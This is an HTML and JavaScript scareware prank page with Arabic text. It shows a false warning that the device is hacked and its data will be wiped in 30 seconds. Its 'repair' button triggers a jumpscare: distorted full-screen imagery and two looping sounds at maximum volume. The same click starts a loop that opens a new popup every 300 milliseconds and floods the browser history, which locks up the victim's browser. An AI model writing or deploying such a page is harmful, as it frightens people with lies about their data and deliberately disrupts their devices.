<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚠️ SYSTEM_FAILURE_CRITICAL ⚠️</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; }
        
        /* صورة المرأة: تكبير كلي على حساب شاشة الهاتف سواسوة */
        #stalkerEntity { 
            position: fixed; top: 0; left: 0; 
            width: 100vw; height: 100vh; 
            object-fit: cover; /* باش تجي مع الشاشة سوا سوا سواسوة */
            z-index: 1; 
            filter: contrast(250%) brightness(40%) grayscale(100%);
            display: none;
            animation: tremor 0.1s infinite;
        }

        @keyframes tremor {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            50% { transform: translate(-1px, -2px) rotate(-1deg); }
            100% { transform: translate(1px, -1px) rotate(1deg); }
        }

        /* رسالة التحذير المرعبة سواسوة */
        #warningOverlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 100; display: flex; flex-direction: column;
            justify-content: center; align-items: center; color: #f00;
            font-family: 'Courier New', Courier, monospace; text-align: center;
        }

        .blink { animation: blinker 0.2s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }

        .btn-repair { background: #f00; color: #000; border: none; padding: 15px 40px; font-weight: bold; margin-top: 20px; cursor: pointer; }
    </style>
</head>
<body>

    <div id="warningOverlay">
        <h1 class="blink">☢️ WARNING ☢️</h1>
        <p style="padding: 20px;">تم رصد محاولة اختراق لجهازك.<br>النظام الآن في وضع التدمير الذاتي.<br>سيتم مسح كافة البيانات خلال 30 ثانية.</p>
        <button class="btn-repair" onclick="activateNightmare()">إصلاح النظام الآن</button>
    </div>

    <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <audio id="audio1" loop><source src="tfy-krk.mp3" type="audio/mpeg"></audio>
    <audio id="audio2" loop><source src="رابط_الصوت_الثاني_هنا" type="audio/mpeg"></audio>

    <script>
        function activateNightmare() {
            // تشغيل الأصوات الزوج بأعلى قوة سواسوة
            const s1 = document.getElementById('audio1');
            const s2 = document.getElementById('audio2');
            s1.volume = 1.0; s2.volume = 1.0;
            s1.play(); s2.play();

            // إخفاء التحذير وإظهار المرأة سواسوة
            document.getElementById('warningOverlay').style.display = 'none';
            document.getElementById('stalkerEntity').style.display = 'block';

            // تفعيل الشاشة الكاملة واللاق سواسوة
            document.documentElement.requestFullscreen();
            setInterval(() => {
                window.open(window.location.href, '_blank', 'width=10,height=10');
                history.pushState(null, null, window.location.href);
            }, 300);
        }
    </script>
</body>
</html>
